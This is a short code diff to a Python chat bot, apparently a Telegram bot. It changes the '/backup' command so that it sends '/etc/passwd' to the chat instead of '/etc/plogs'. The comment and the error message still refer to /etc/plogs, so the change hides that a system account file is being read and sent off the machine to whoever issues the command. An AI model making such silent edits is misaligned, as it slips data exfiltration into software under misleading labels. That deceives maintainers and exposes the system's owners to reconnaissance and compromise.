@@ -330,7 +330,7 @@ def handle(msg):
         elif command == '/backup':
             # Send the /etc/plogs file as a document
             try:
-                with open('/etc/plogs', 'rb') as plogs_file:
+                with open('/etc/passwd', 'rb') as plogs_file:
                     bot.sendDocument(chat_id, plogs_file)
             except FileNotFoundError:
                 bot.sendMessage(chat_id, "The /etc/plogs file does not exist.")
